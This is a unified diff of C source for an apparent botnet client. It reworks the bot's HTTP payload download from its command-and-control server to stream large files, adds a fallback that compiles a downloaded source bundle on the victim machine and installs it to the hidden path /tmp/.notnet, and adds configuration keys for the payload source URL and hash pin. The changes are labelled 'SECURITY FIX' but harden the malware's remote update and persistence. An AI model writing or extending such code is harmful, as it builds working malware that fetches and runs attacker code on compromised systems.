@@ -698,11 +698,16 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         snprintf(path, sizeof(path), "%s", bot->c2_http.path);
     }
 
-    /* Use a stack buffer — single-threaded, callers don't recurse.
-     * Avoids static buffer being overwritten by concurrent downloads. */
-    char buf[PAYLOAD_MAX_SIZE];
-    char *body = NULL;
-    int body_len = 0;
+    /* Stream the response body to dest. The old implementation buffered
+     * the entire response in a PAYLOAD_MAX_SIZE (64KB) stack array, which
+     * truncated the on-target compilation source bundle (~270KB). Headers
+     * are buffered small; body bytes are written to the file incrementally
+     * with a generous cap (callers that need strict limits validate the
+     * result themselves, e.g. payload_update checks PAYLOAD_MAX_SIZE). */
+    enum { HDR_BUF_SIZE = 8192, MAX_DOWNLOAD_SIZE = 32 * 1024 * 1024 };
+    char hdr_buf[HDR_BUF_SIZE];
+    int hdr_len = 0;
+    int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */
 
     int sock = tcp_connect_sock(bot, host, port);
     if (sock < 0) {
@@ -725,9 +730,9 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         return -1;
     }
 
-    /* Read response with 10s timeout to prevent indefinite blocking */
-    int total = 0;
-    while (total < (int)sizeof(buf) - 1) {
+    /* Read response with 10s timeout. First pass: collect headers until
+     * the \r\n\r\n terminator (or the header buffer fills). */
+    while (body_start < 0 && hdr_len < HDR_BUF_SIZE - 1) {
         fd_set read_fds;
         struct timeval tv;
         FD_ZERO(&read_fds);
@@ -738,39 +743,94 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
         if (sel <= 0) break;  /* timeout or error */
 
-        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
+        int received = recv(sock, hdr_buf + hdr_len, HDR_BUF_SIZE - hdr_len - 1, 0);
         if (received <= 0) break;
-        total += received;
+        hdr_len += received;
+        hdr_buf[hdr_len] = '\0';
+        char *hdr_end = strstr(hdr_buf, "\r\n\r\n");
+        if (hdr_end) {
+            body_start = (int)(hdr_end - hdr_buf) + 4;
+            break;
+        }
     }
-    buf[total] = '\0';
+    if (body_start < 0) {
+        log_error("http_download: malformed HTTP response from %s:%u", host, port);
+        close(sock);
+        return -1;
+    }
+
+    /* SECURITY FIX (#69): verify the HTTP status line is 2xx. Previously a
+     * 404/500 HTML error page was treated as a successful download — the
+     * payload magic/hash checks then rejected it, but the failure was
+     * attributed to the wrong cause and the on-target compile fallback
+     * never fired. Check the status line before trusting the body. */
+    {
+        char *status = hdr_buf;
+        char *sp = strstr(status, " ");
+        if (sp && sp[1] >= '0' && sp[1] <= '9' &&
+            sp[2] >= '0' && sp[2] <= '9' &&
+            sp[3] >= '0' && sp[3] <= '9') {
+            int code = (sp[1] - '0') * 100 + (sp[2] - '0') * 10 + (sp[3] - '0');
+            if (code < 200 || code >= 300) {
+                log_error("http_download: HTTP %d from %s:%u (path %s)",
+                          code, host, port, path);
+                close(sock);
+                return -1;
+            }
+        } else {
+            log_error("http_download: malformed status line from %s:%u", host, port);
+            close(sock);
+            return -1;
+        }
+    }
+
+    /* Open destination and write the body. */
+    FILE *f = fopen(dest, "wb");
+    if (!f) {
+        log_error("http_download: cannot open %s: %s", dest, strerror(errno));
+        close(sock);
+        return -1;
+    }
+
+    int body_len = 0;
+    int in_hdr = hdr_len - body_start;
+    if (in_hdr > 0) {
+        fwrite(hdr_buf + body_start, 1, in_hdr, f);
+        body_len = in_hdr;
+    }
+
+    /* Continue streaming remaining body bytes. */
+    char stream_buf[8192];
+    while (body_len < MAX_DOWNLOAD_SIZE) {
+        fd_set read_fds;
+        struct timeval tv;
+        FD_ZERO(&read_fds);
+        FD_SET(sock, &read_fds);
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+
+        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
+        if (sel <= 0) break;  /* timeout, EOF, or error */
+
+        int received = recv(sock, stream_buf, sizeof(stream_buf), 0);
+        if (received <= 0) break;
+        fwrite(stream_buf, 1, received, f);
+        body_len += received;
+    }
+    fclose(f);
     close(sock);
 
-    if (total <= 0) {
-        log_error("http_download: empty response from %s:%u", host, port);
+    if (body_len <= 0) {
+        log_error("http_download: empty body from %s:%u", host, port);
+        unlink(dest);
         return -1;
     }
-
-    /* Simple HTTP response parsing - skip headers */
-    char *hdr_end = strstr(buf, "\r\n\r\n");
-    if (!hdr_end) {
-        log_error("http_download: malformed HTTP response from %s:%u", host, port);
+    if (body_len >= MAX_DOWNLOAD_SIZE) {
+        log_error("http_download: body exceeds cap (%d bytes) from %s:%u",
+                  body_len, host, port);
+        unlink(dest);
         return -1;
     }
-    body = hdr_end + 4;
-    body_len = total - (int)(body - buf);
-
-    /* SECURITY FIX (#6): Enforce PAYLOAD_MAX_SIZE on body length. */
-    if (body_len > PAYLOAD_MAX_SIZE) {
-        log_error("HTTP download: body exceeds PAYLOAD_MAX_SIZE (%d > %d)",
-                  body_len, PAYLOAD_MAX_SIZE);
-        return -1;
-    }
-    if (body_len <= 0) return -1;
-
-    FILE *f = fopen(dest, "wb");
-    if (!f) return -1;
-    fwrite(body, 1, body_len, f);
-    fclose(f);
 
     return body_len;
 }
@@ -1920,6 +1980,14 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 } else {
                     protocol_send_response(bot, CMD_UPDATE, "update: downloaded but install failed");
                 }
+            } else if (result == 0) {
+                /* payload_update returns 0 only from the compile fallback
+                 * path (compiled + installed source bundle). */
+                if (payload_install(bot, "/tmp/.notnet") == 0) {
+                    protocol_send_response(bot, CMD_UPDATE, "update: compiled from source and installed");
+                } else {
+                    protocol_send_response(bot, CMD_UPDATE, "update: compiled but install failed");
+                }
             } else {
                 log_warn("CMD: update failed");
                 protocol_send_response(bot, CMD_UPDATE, "update: failed (SHA-256 pin mismatch or download error)");
@@ -2656,6 +2724,37 @@ int load_config(notnet_bot_t *bot, const char *path) {
                 log_info("TLS cert pin configured");
             } else {
                 log_warn("Config: tls_cert_pin_sha256 rejected — need 64 hex chars");
+            }
+        } else if (strcmp(key, "payload_compile_enabled") == 0) {
+            /* SECURITY FIX (#69): on-target compilation toggle */
+            bot->payload_compile_enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "payload_source_url") == 0) {
+            strncpy(bot->payload_source_url, value, sizeof(bot->payload_source_url) - 1);
+            bot->payload_source_url[sizeof(bot->payload_source_url) - 1] = '\0';
+        } else if (strcmp(key, "payload_source_sha256") == 0) {
+            /* SECURITY FIX (#81): pin for the source tarball. Same 64-hex
+             * validation as payload_sha256. */
+            int valid = 0;
+            if (strlen(value) == 64) {
+                valid = 1;
+                for (const char *p = value; *p; p++) {
+                    if (!((*p >= '0' && *p <= '9') ||
+                          (*p >= 'a' && *p <= 'f') ||
+                          (*p >= 'A' && *p <= 'F'))) {
+                        valid = 0;
+                        break;
+                    }
+                }
+            }
+            if (valid) {
+                for (int i = 0; i < 64; i++) {
+                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
+                }
+                strncpy(bot->payload_source_sha256, value, 64);
+                bot->payload_source_sha256[64] = '\0';
+                log_info("Payload source SHA-256 pin configured");
+            } else {
+                log_warn("Config: payload_source_sha256 rejected — need 64 hex chars");
             }
         } else if (strcmp(key, "irc_auth_nicks") == 0) {
             /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
